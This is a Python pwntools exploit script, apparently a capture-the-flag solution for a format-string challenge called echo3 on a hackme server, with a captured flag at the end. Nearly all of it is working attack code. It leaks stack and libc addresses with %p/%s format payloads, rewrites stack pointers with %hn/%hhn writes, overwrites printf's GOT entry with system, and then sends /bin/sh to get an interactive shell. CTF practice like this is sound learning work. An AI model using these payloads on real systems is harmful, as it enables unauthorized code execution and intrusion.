#!/usr/bin/python3
# -*- coding: utf-8 -*-

"""
{32: 1024, 48: 1024, 64: 1024, 4128: 1024, 4144: 1024, 4160: 1024, 8224: 1024, 8240: 1024, 8256: 1024, 16: 512, 80: 512, 4112: 512, 4176: 512, 8208: 512, 8272: 512, 12320: 16, 12336: 16, 12352: 16, 12304: 8, 12368: 2}
20

栈上制造空间一共20种情况

b *0x08048737  read magic
b *0x08048774  分配栈空间
b read + 5
b *0x08048646  printf

%18$p#%18$s  # 读取ebp，和下一个ebp的地址

"""


import re, sys, os.path as path, struct
from pwn import *
from pwnlib import gdb


context(arch="i386", os="linux", log_level="debug")

elf_name = path.join(path.dirname(path.abspath(__file__)), "echo3_norandom_patched")
_, host, port = re.split("\s+", "nc hackme.inndy.tw 7720")

elf = ELF(elf_name)
io = remote(host, port) if len(sys.argv) > 1 else process(elf_name)
libc = elf.libc


class A:
    random_bytes = 0  # TODO: 随机化情况需要修改
    esp_addr = None
    ebp0addr = None
    ebp1addr = None
    p0idx = 88 // 4
    p1idx = (316 + random_bytes) // 4
    p2idx = None
    p0addr = None
    p1addr = None
    p2addr = None
    i_addr = None

    @staticmethod
    def get_libc_and_stack_addr():
        # 获取libc与栈地址
        payload = "%18$p#%19$p#%34$p#%35$p$$$$$$$$\0"
        io.sendline(payload)
        r = io.recvuntil("$$$$$$$$", drop=True)
        a = r.split(b"#")
        assert a[1] == b"0x804877b" and a[2] == b"(nil)"
        A.ebp1addr = int(a[0], 16)
        log.info("ebp1addr = 0x%x", A.ebp1addr)
        A.esp_addr = A.ebp1addr - A.random_bytes - 136
        log.info("esp_addr = 0x%x", A.esp_addr)
        libc_addr = int(a[3], 16)
        log.info("libc_addr = 0x%x", libc_addr)
        libc.address = (libc_addr - 0x18000) & 0xfffff000
        log.info("libc_basse = 0x%x", libc.address)

    @staticmethod
    def get_var_i_addr():
        # 获取变量i的地址
        A.ebp0addr = A.esp_addr + 72
        log.info("ebp0addr = 0x%x", A.ebp0addr)
        
        A.p0addr = A.esp_addr + 88
        log.info("p0addr = 0x%x", A.p0addr)
        A.p1addr = A.esp_addr + A.random_bytes + 316
        log.info("p1addr = 0x%x", A.p1addr)
        A.i_addr = A.ebp0addr - 0x14
        log.info("i_addr = 0x%x", A.i_addr)

    @staticmethod
    def set_var_i_minus():
        # 修改变量i
        # 0088| 0xffffd448 --> 0xffffd52c --> 0xffffd6b2 ("USER=admin")
        # 上面有三重指针，而且指针均在栈上可被printf访问。逐级改写地址，使最后一个指向变量i
        assert (A.i_addr + 3) & 0xffff == (A.i_addr & 0xffff) + 3  # 为了修改最高位，使其变为负数
        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=A.p0idx, data=(A.i_addr + 3) & 0xffff)
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)
        payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=A.p1idx, data=0x80)
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)

    @staticmethod
    def write_printf_got_addresses():
        A.p2addr = (A.p1addr & 0xffffff00) + 0x100
        log.info("p2addr = 0x%x", A.p2addr)
        A.p2idx = (A.p2addr - A.esp_addr) // 4
        payload = "%{data}c%{p0idx}$hn$$$$$$$$\0".format(p0idx=A.p0idx, data=A.p2addr & 0xffff)
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)

        a = elf.got["printf"]
        gots = struct.pack("<IIII", a, a + 1, a + 2, a + 3)
        for i in range(16):
            if i > 0:
                payload = "%{data}c%{p0idx}$hhn$$$$$$$$\0".format(p0idx=A.p0idx, data=(A.p2addr & 0xff) + i)
                io.sendline(payload)
                io.recvuntil("$$$$$$$$", drop=True)
            payload = "%{data}c%{p1idx}$hhn$$$$$$$$\0".format(p1idx=A.p1idx, data=gots[i])
            io.sendline(payload)
            io.recvuntil("$$$$$$$$", drop=True)

    @staticmethod
    def write_system_to_printf_got():
        a = libc.sym["system"]
        l = [0]
        for i in range(4):
            byte = (((a >> (i * 8)) & 0xff) - sum(l)) & 0xff
            if byte == 0:
                byte = 256
            l.append(byte)
        l = l[1:]
        payload = "".join(["%{}c%{}$hhn".format(data, A.p2idx + i) for i, data in enumerate(l)]) + "$$$$$$$$\0"
        io.sendline(payload)
        io.recvuntil("$$$$$$$$", drop=True)

    @staticmethod
    def main():
        A.get_libc_and_stack_addr()
        A.get_var_i_addr()
        A.set_var_i_minus()
        A.write_printf_got_addresses()
        A.write_system_to_printf_got()


def main():
    A.main()
    io.sendline("/bin/sh")
    io.interactive()


if __name__ == "__main__":
    main()

# CTF{081ecc7c8d658409eb43358dcc1cf446}